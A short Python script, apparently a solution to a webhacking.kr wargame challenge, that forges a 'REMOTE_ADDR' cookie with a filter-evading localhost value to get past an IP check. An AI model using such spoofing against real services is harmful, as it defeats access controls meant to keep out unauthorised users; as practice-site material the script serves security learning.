import requests
from phpsessid import cookies

url = 'https://webhacking.kr/challenge/bonus-4/'
cookies['REMOTE_ADDR'] = '112277....00....00....1'

response = requests.get(url, cookies=cookies)
print(response.text)

